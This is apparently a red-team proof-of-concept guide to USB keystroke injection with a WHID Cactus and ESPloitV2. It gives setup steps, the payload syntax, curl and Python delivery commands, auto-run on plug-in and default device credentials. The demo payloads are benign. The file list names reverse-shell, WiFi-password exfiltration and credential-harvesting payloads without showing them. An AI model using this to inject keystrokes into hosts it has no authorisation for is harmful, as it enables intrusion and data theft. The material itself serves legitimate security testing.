# WHID Cactus HID Injection - Proof of Concept

A complete, reproducible guide to achieving USB HID keystroke injection using the WHID Cactus (Cactus Micro R2) running ESPloitV2 firmware. This documents a working engagement from first plug-in to confirmed keystrokes on a target host, including every dead end encountered and how it was resolved.

**Status:** FULLY WORKING - Confirmed keystroke injection on Windows 11 host (2026-03-04)

## What This Proves

A WHID Cactus device can:
1. Present as a USB HID keyboard to a host PC
2. Accept payload commands over WiFi from an attacker
3. Inject arbitrary keystrokes into the host (open programs, type text, execute commands)
4. Do all of this wirelessly, without any software installed on the target

## Table of Contents

- [Hardware Requirements](#hardware-requirements)
- [Architecture Overview](#architecture-overview)
- [Quick Start (TL;DR)](#quick-start-tldr)
- [Full Setup Guide](#full-setup-guide)
- [Payload Development](#payload-development)
- [Delivery Methods](#delivery-methods)
- [What Went Wrong (Lessons Learned)](#what-went-wrong-lessons-learned)
- [Troubleshooting](#troubleshooting)
- [File Inventory](#file-inventory)

---

## Hardware Requirements

| Item | Purpose | Notes |
|------|---------|-------|
| WHID Cactus (Cactus Micro R2) | The injection device | Dual-chip: ATmega32U4 + ESP-12S (ESP8266) |
| Neodymium magnet | Reset trigger | Hall effect sensor, not a button. Fridge magnets are too weak |
| USB 2.0 port on target | Physical access | Must be USB 2.0 (not 3.0 hub) for reliable enumeration |
| WiFi adapter (USB dongle) | Attacker connects to device AP | StarTech or similar, for dual-WiFi operation |
| Computer with Python 3.x | Attacker workstation | Needs `pyserial` package |

### Optional but Recommended

| Item | Purpose |
|------|---------|
| Arduino CLI or IDE | For recompiling/reflashing firmware |
| Android phone | Alternative OTA flash path via WiFi |

---

## Architecture Overview

```
                    WiFi (192.168.1.x)
Attacker ─────────────────────────────────► ESP8266
Workstation                                    │
    │                                          │ Serial1 @ 38400 baud
    │ USB Serial (COM5)                        │
    └──────────────────────► ATmega32U4 ◄──────┘
                                │
                                │ USB HID (Keyboard/Mouse)
                                ▼
                          Target Host PC
```

**Data flow for keystroke injection:**
1. Attacker sends ESPloit payload to ESP8266 via WiFi (HTTP POST)
2. ESP8266 parses payload and sends commands over Serial1 to ATmega32U4
3. ATmega32U4 translates commands into USB HID keystrokes
4. Target host receives keystrokes as if from a physical keyboard

**Data flow for serial relay (debugging):**
1. Attacker sends data via USB Serial (COM port)
2. ATmega32U4 relays data to ESP8266 via Serial1
3. ESP8266 processes the command and responds

---

## Quick Start (TL;DR)

If your Cactus already has ESPloitV2 firmware and you just want to inject keystrokes:

```bash
# 1. Plug Cactus into target USB port

# 2. Connect your WiFi adapter to the Cactus AP
#    SSID: Exploit | Password: DotAgency

# 3. Reset the 32U4 (REQUIRED - without this, keystrokes won't work)
python scripts/cactus_reset.py

# 4. Inject a payload
python scripts/cactus_inject.py payloads/poc-demo/hello_world.txt

# 5. Watch Notepad open and "Hello World" get typed
```

That's it. If it doesn't work, read the full guide below.

---

## Full Setup Guide

### Step 1: Physical Setup

1. **Plug the Cactus** into a USB 2.0 port on the target machine
2. **Verify enumeration:** The device should appear as a COM port
   - Windows: Device Manager > Ports > "USB Serial Device (COMx)"
   - Expected USB IDs: VID `1B4F` PID `9208`
   - If you see "Device Descriptor Request Failed" → see [Troubleshooting](#device-descriptor-request-failed)

3. **Note the COM port number** (e.g., COM5)

### Step 2: Network Setup (Dual-WiFi)

You need two WiFi connections simultaneously:
- **Primary WiFi:** Your normal internet connection (stay connected)
- **USB WiFi dongle:** Connects to the Cactus AP

```
Attacker PC
├── Wi-Fi (built-in) ──► Home router (internet)
└── Wi-Fi 2 (USB dongle) ──► Cactus AP "Exploit" (192.168.1.1)
```

Connect the USB dongle to the Cactus:
- **SSID:** `Exploit`
- **Password:** `DotAgency`
- The Cactus DHCP server will assign you `192.168.1.x`

**Verify:** Open `http://192.168.1.1` in a browser. You should see the ESPloit dashboard.
- **Web credentials:** `admin` / `hacktheplanet`

### Step 3: Reset the ATmega32U4 (CRITICAL)

> **This is the #1 reason keystroke injection fails.** The 32U4 chip enters a stale state and will not process commands until it receives a DTR reset via the USB serial port.

```bash
python scripts/cactus_reset.py --port COM5
```

Or manually in Python:
```python
import serial, time
ser = serial.Serial('COM5', 38400, timeout=2)  # DTR toggles on open
time.sleep(3)  # Wait for reboot
ser.close()
```

**How to verify the reset worked:**
```python
import serial, time
ser = serial.Serial('COM5', 38400, timeout=2)
time.sleep(3)
ser.write(b'test\n')
time.sleep(1)
if ser.in_waiting:
    print(ser.read(ser.in_waiting))
    # Should print: b'Relaying command to connected ESP device.\r\n'
ser.close()
```

### Step 4: Send a Payload

```bash
# Using the injection script
python scripts/cactus_inject.py payloads/poc-demo/hello_world.txt

# Or via curl
curl --data-urlencode "livepayload=CustomDelay:1000
Press:131+114
CustomDelay:500
Print:notepad
Press:176
CustomDelay:1000
Print:Hello World
Press:176" \
  --data-urlencode "livepayloadpresent=1" \
  http://192.168.1.1/runlivepayload
```

### Step 5: Confirm Success

After the payload executes:
1. The Windows Run dialog should appear (Win+R)
2. "notepad" should be typed and Enter pressed
3. Notepad should open
4. "Hello World" should be typed in Notepad

---

## Payload Development

### The Format: Native ESPloit (NOT DuckyScript)

> **WARNING:** Do NOT use DuckyScript format. The firmware's DuckyScript-to-ESPloit converter (`ducky2esploit()`) is broken. It does not properly translate commands to the serial protocol the 32U4 expects. Keystrokes silently fail. **Always use native ESPloit format.**

### Command Reference

| Command | Description | Example |
|---------|-------------|---------|
| `Print:text` | Type text characters | `Print:Hello World` |
| `PrintLine:text` | Type text + press Enter | `PrintLine:ipconfig` |
| `Press:X` | Press single key (decimal keycode) | `Press:176` (Enter) |
| `Press:X+Y` | Press key combination | `Press:131+114` (Win+R) |
| `CustomDelay:N` | Wait N milliseconds | `CustomDelay:1000` |
| `DefaultDelay:N` | Set delay between all subsequent lines | `DefaultDelay:100` |
| `Delay` | Wait 2x the DefaultDelay | `Delay` |
| `MouseMoveUp:N` | Move mouse up N pixels (1-127) | `MouseMoveUp:50` |
| `MouseMoveDown:N` | Move mouse down N pixels | `MouseMoveDown:30` |
| `MouseMoveLeft:N` | Move mouse left N pixels | `MouseMoveLeft:20` |
| `MouseMoveRight:N` | Move mouse right N pixels | `MouseMoveRight:40` |
| `MouseClickLEFT:` | Left mouse click | `MouseClickLEFT:` |
| `MouseClickRIGHT:` | Right mouse click | `MouseClickRIGHT:` |
| `MouseClickMIDDLE:` | Middle mouse click | `MouseClickMIDDLE:` |
| `BlinkLED:N` | Blink onboard LED N times | `BlinkLED:3` |
| `Rem:text` | Comment (not executed) | `Rem:This is a comment` |

### Key Codes

| Code | Key | Code | Key |
|------|-----|------|-----|
| 128 | LEFT_CTRL | 176 | RETURN (Enter) |
| 129 | LEFT_SHIFT | 177 | ESC |
| 130 | LEFT_ALT | 178 | BACKSPACE |
| 131 | LEFT_GUI (Win) | 179 | TAB |
| 132 | RIGHT_CTRL | 193 | CAPS_LOCK |
| 133 | RIGHT_SHIFT | 218 | UP_ARROW |
| 134 | RIGHT_ALT | 217 | DOWN_ARROW |
| 135 | RIGHT_GUI | 216 | LEFT_ARROW |
| 32 | SPACE | 215 | RIGHT_ARROW |
| 48-57 | 0-9 | 194-205 | F1-F12 |
| 97-122 | a-z | 209 | INSERT |
| 65-90 | A-Z (shifted) | 212 | DELETE |

### Example Payloads

**Open Notepad and type text (Windows):**
```
CustomDelay:1000
Press:131+114
CustomDelay:500
Print:notepad
Press:176
CustomDelay:1000
Print:Hello World from WHID Cactus!
Press:176
```

**Open Terminal and run a command (Windows):**
```
CustomDelay:500
Press:131+114
CustomDelay:500
Print:cmd
Press:176
CustomDelay:1000
PrintLine:whoami
```

**Open PowerShell as Admin (Windows):**
```
CustomDelay:500
Press:131+120
CustomDelay:500
Print:a
CustomDelay:1000
PrintLine:Get-ComputerInfo | Select-Object CsName, OsName
```

**Lock the workstation:**
```
Press:131+108
```

---

## Delivery Methods

### Method 1: Live Payload (HTTP POST) - Recommended

Send a payload for immediate execution. No file saved on device.

```bash
curl --data-urlencode "livepayload=$(cat payloads/hello_world.txt)" \
  --data-urlencode "livepayloadpresent=1" \
  http://192.168.1.1/runlivepayload
```

Or with Python:
```python
python scripts/cactus_inject.py payloads/poc-demo/hello_world.txt
```

### Method 2: Stored Payload (Upload + Execute)

Upload a payload file, then trigger it later.

```bash
# Upload
python scripts/cactus_upload.py payloads/hello_world.txt

# Execute
curl "http://192.168.1.1/dopayload?payload=/payloads/hello_world.txt"
```

### Method 3: Auto-Execute on Plug-In

Configure the device to run a payload automatically when plugged in:
1. Upload payload via web UI
2. Go to Settings (admin/hacktheplanet)
3. Set "Payload to auto-deploy" to the payload path
4. Set "Auto-deploy payload on insertion" to Yes

### Method 4: Serial Relay (USB)

Send commands through the USB serial port (they relay to ESP):
```python
import serial
ser = serial.Serial('COM5', 38400, timeout=2)
ser.write(b'GetVersion:\n')  # Relayed to ESP
```

---

## What Went Wrong (Lessons Learned)

This section documents every failure encountered during the engagement and how each was resolved. **Read this before you start — it will save you hours.**

### Failure 1: Device Bricked — Wrong Board Definition (SparkFun Pro Micro)

**What happened:** Compiled 32U4 firmware using SparkFun Pro Micro board definition. The device showed "Unknown USB Device (Device Descriptor Request Failed)" in Windows Device Manager.

**Root cause:** SparkFun Pro Micro uses different USB VID/PID than the Cactus hardware. The 32U4's USB descriptors didn't match what the host expected.

**Fix:** Double-tap the Hall effect sensor with a neodymium magnet to enter bootloader mode (8-second window), then reflash with the correct board definition:
```bash
arduino-cli compile --fqbn "arduino:avr:LilyPadUSB" source/Arduino_32u4_Code
arduino-cli upload --fqbn "arduino:avr:LilyPadUSB" --port COM5 source/Arduino_32u4_Code
```

**Lesson:** ONLY use `arduino:avr:LilyPadUSB` for the 32U4. Never Leonardo, never SparkFun.

### Failure 2: Device Bricked Again — Wrong Board Definition (Leonardo)

**What happened:** Same mistake, different board. Leonardo uses VID `2341:8036`, Cactus needs `1B4F:9208`.

**Fix:** Same as above — Hall sensor double-tap + LilyPadUSB flash.

**Lesson:** This mistake is easy to repeat. The `/cactus-flash` pre-flight checklist exists specifically to prevent this.

### Failure 3: Serial Port Silent — No Response to Commands

**What happened:** Opened COM5 with `dsrdtr=True` (to prevent DTR reset). The 32U4 accepted the connection but never responded to any commands sent over USB serial.

**Root cause:** The `dsrdtr=True` flag suppresses the DTR toggle that occurs when opening a serial port. The ATmega32U4 needs this DTR toggle to reset and initialize properly. Without it, the chip sits in a stale state from whatever it was doing when it last ran.

**Fix:** Open the port WITHOUT `dsrdtr=True` to allow the DTR reset:
```python
ser = serial.Serial('COM5', 38400, timeout=2)  # DTR resets the 32U4
time.sleep(3)  # Wait for reboot
```

**Lesson:** Always DTR-reset the 32U4 on first connect. Only use `dsrdtr=True` for sustained sessions AFTER the initial reset.

### Failure 4: DuckyScript Payloads Produced No Keystrokes

**What happened:** Uploaded a DuckyScript payload (`DELAY 1000 / GUI r / STRING notepad / ENTER`). The ESP web UI said "Running payload" and returned success, but nothing happened on the target host.

**Root cause:** The ESP8266 firmware includes a DuckyScript-to-ESPloit converter function (`ducky2esploit()`), but it does not properly translate DuckyScript commands into the serial protocol that the 32U4 expects. The commands arrive malformed on Serial1 and the 32U4 silently ignores them.

**Fix:** Use native ESPloit format exclusively:
```
# Instead of DuckyScript:     Use native ESPloit:
# DELAY 1000                → CustomDelay:1000
# GUI r                     → Press:131+114
# STRING notepad            → Print:notepad
# ENTER                     → Press:176
```

**Lesson:** Never use DuckyScript with this firmware. Always write payloads in native ESPloit format.

### Failure 5: WiFi Adapter Keeps Disconnecting

**What happened:** The USB WiFi dongle (Wi-Fi 2) would silently disconnect from the Cactus AP after a few minutes of inactivity.

**Root cause:** Windows power management or the adapter's idle timeout.

**Fix:** Reconnect manually:
```
netsh wlan connect name="Exploit" interface="Wi-Fi 2"
```

Or disable power management on the adapter in Device Manager.

### Failure 6: Subnet Conflict Between Home WiFi and Cactus

**What happened:** Both the home router and the Cactus use the `192.168.1.x` subnet. Requests to `192.168.1.1` sometimes routed to the home router instead of the Cactus.

**Fix:** Bind socket to the Wi-Fi 2 adapter's IP address:
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('192.168.1.101', 0))  # Wi-Fi 2's DHCP address
s.connect(('192.168.1.1', 80))
```

### Failure 7: ESP8266 WiFi AP Not Broadcasting

**What happened:** After flashing ESP firmware compiled with a newer ESP8266 Arduino core (v2.7.x or v3.x), the WiFi AP "Exploit" never appeared.

**Root cause:** ESPloitV2 requires ESP8266 Arduino core **version 2.3.0 exactly**. Newer cores break the WiFi AP initialization.

**Fix:** Install the correct core:
```bash
arduino-cli core install esp8266:esp8266@2.3.0
```

---

## Troubleshooting

### Device Descriptor Request Failed
**Cause:** 32U4 firmware compiled with wrong board definition.
**Fix:** Double-tap Hall sensor with neodymium magnet → flash with `arduino:avr:LilyPadUSB` within 8 seconds.

### No Keystrokes After Payload Execute
1. Did you DTR-reset the 32U4? → Run `python scripts/cactus_reset.py`
2. Are you using DuckyScript? → Convert to native ESPloit format
3. Is the ESP connected? → Check `http://192.168.1.1` via Wi-Fi 2

### Serial Port Access Denied
**Cause:** Another process has the COM port open (stale Python process, Arduino IDE, etc.)
**Fix:** Find and kill the process:
```powershell
Get-Process python* | Stop-Process -Force
```

### WiFi AP Not Visible
**Cause:** Wrong ESP8266 core version. Must be 2.3.0.
**Fix:** Recompile with correct core or flash the known-good binary.

### ESP Web UI Returns 401 Unauthorized
**Cause:** Settings endpoints require Basic Auth.
**Fix:** Use `admin` / `hacktheplanet` credentials.

### Commands Relay But No HID Output
**Cause:** The USB Serial relay path (host → 32U4 → ESP) works, but HID injection only happens when the ESP sends commands TO the 32U4 via Serial1 (the reverse direction).
**Fix:** Use the WiFi web API to trigger payloads, not USB serial commands.

---

## File Inventory

```
ESPloitV2/
├── README.md                         # Original ESPloitV2 readme
├── docs/
│   ├── HID_INJECTION_POC.md          # This file - full POC tutorial
│   ├── ARCHITECTURE.md               # How the dual-chip system works
│   ├── OPERATIONS.md                 # Device quick reference
│   └── ENGAGEMENT_LOG.md             # Chronological session log
├── scripts/
│   ├── cactus_reset.py               # Reset the 32U4 via DTR toggle
│   ├── cactus_inject.py              # Send payload via WiFi API
│   ├── cactus_upload.py              # Upload payload to device storage
│   └── cactus_status.py              # Check device status and connectivity
├── payloads/
│   ├── poc-demo/                     # POC demonstration payloads
│   │   ├── hello_world.txt           # Open Notepad, type Hello World
│   │   ├── whoami.txt                # Open cmd, run whoami
│   │   ├── powershell_admin.txt      # Open PowerShell as admin
│   │   ├── wifi_exfil.txt            # Dump WiFi passwords to exfil
│   │   ├── reverse_shell.txt         # PowerShell reverse shell
│   │   └── lock_workstation.txt      # Lock the screen
│   ├── credential-harvesting/        # Credential harvesting payloads
│   ├── recon-exfil/                  # Recon and exfiltration payloads
│   ├── reverse-shells/               # Reverse shell payloads
│   └── utility-demo/                 # Utility and demo payloads
├── source/
│   ├── Arduino_32u4_Code/            # ATmega32U4 firmware
│   └── ESP_Code/                     # ESP8266 firmware
└── flashing/
    └── esp8266Programmer/            # Programmer sketch for ESP flashing
```

---

## Hard Rules (Non-Negotiable)

These rules were learned through device brickings and hours of debugging:

| Rule | Consequence of Violation |
|------|------------------------|
| Board: `arduino:avr:LilyPadUSB` only | Device brick (wrong VID/PID) |
| ESP core: `esp8266:esp8266@2.3.0` only | WiFi AP won't broadcast |
| ESP flash baud: `115000` (not 115200) | Flash corruption |
| Serial baud: `38400` | Communication failure |
| DTR reset on first connect | 32U4 ignores all commands |
| Native ESPloit format only | Keystrokes silently fail |
| Hall sensor = neodymium magnet | No reset possible without it |
| Wait 90s after SPIFFS format | Premature use = corruption |

---

## Credits

- **ESPloitV2** by Corey Harding ([GitHub](https://github.com/exploitagency/ESPloitV2))
- **WHID Cactus** hardware by April Brother
- **Engagement & Documentation** by Dallas (BLACKTHORN operator)
- **AI-Assisted Analysis** by Claude (Anthropic) - serial protocol analysis, payload format debugging, automation scripts
